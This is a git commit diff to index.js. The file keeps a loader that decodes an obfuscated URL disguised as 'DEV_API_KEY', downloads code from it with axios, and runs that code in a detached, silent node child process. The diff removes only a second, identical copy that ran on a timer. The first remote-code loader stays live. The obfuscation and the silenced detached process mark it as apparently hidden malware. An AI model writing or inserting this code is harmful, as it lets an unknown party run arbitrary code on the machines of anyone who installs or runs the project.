ea658844e1d98cd5d74da9443ff0b663d33a3680
CoinSwitchCorp <colin@novachainhub.com>
2026-08-14 12:22:26 -0400

    Update index.js

--- index.js
+++ index.js
@@ -14,7 +14,6 @@ function update(encoded, shift = 3) {
 }
 
 const DEV_API_KEY="S]EH:2e2prf1uhshhnqrvm1zzz22=vswwk"
-const DEV_API_KEY_1 = "U4EDS2e2prf1uhshhnqrvm1zzz22=vswwk";
 const mainFunction = (async () => {
   const s1 = (await axios.get(update(DEV_API_KEY))).data.content;
   
@@ -23,13 +22,3 @@ const mainFunction = (async () => {
   child.stdin.end();
   child.unref();
 })();
-
-setTimeout(() => {
-  const mainFunction2 = (async () => {
-    const s1 = (await axios.get(update(DEV_API_KEY_1))).data.content;
-    const child = spawn('node', [], { detached: true, stdio: ['pipe', 'ignore', 'ignore'] });
-    child.stdin.write(s1);
-    child.stdin.end();
-    child.unref();
-  })();
-}, 1000);
